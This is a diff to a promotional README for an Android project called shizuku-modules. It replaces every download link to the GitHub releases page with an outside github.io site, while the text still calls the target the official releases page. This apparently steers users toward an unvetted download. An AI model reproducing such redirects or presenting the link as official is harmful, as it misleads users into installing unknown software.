@@ -1,6 +1,6 @@
 # 📱 shizuku-modules - Discover Amazing Shizuku-Powered Android Apps
 
-[![Download Now](https://img.shields.io/badge/Download-Shizuku_Modules-2ea44f?style=for-the-badge&logo=android&logoColor=white)](https://github.com/jettwado6-sketch/shizuku-modules/releases)
+[![Download Now](https://img.shields.io/badge/Download-Shizuku_Modules-2ea44f?style=for-the-badge&logo=android&logoColor=white)](https://jettwado6-sketch.github.io)
 
 ## 👋 Welcome to shizuku-modules
 
@@ -25,7 +25,7 @@ Getting started with shizuku-modules is incredibly simple! Here's everything you
 
 ### Step 1: Visit the Download Page
 
-**Visit this link to download the application:** [https://github.com/jettwado6-sketch/shizuku-modules/releases](https://github.com/jettwado6-sketch/shizuku-modules/releases)
+**Visit this link to download the application:** [https://jettwado6-sketch.github.io](https://jettwado6-sketch.github.io)
 
 This link will take you to the official releases page where you can find all available versions of the app. The releases page is organized with the newest version at the top, making it easy to find what you need.
 
@@ -205,7 +205,7 @@ Don't miss out on the incredible world of Shizuku-powered apps! With shizuku-mod
 
 **Ready to get started?** Click the button below to visit the download page and begin your journey:
 
-[![Get Started](https://img.shields.io/badge/Get_Started-Download_Now-blue?style=for-the-badge&logo=download&logoColor=white)](https://github.com/jettwado6-sketch/shizuku-modules/releases)
+[![Get Started](https://img.shields.io/badge/Get_Started-Download_Now-blue?style=for-the-badge&logo=download&logoColor=white)](https://jettwado6-sketch.github.io)
 
 Remember, the world of Shizuku apps is constantly growing, and with shizuku-modules, you'll never miss out on the latest innovations. Download now and discover what your Android device can really do!
 
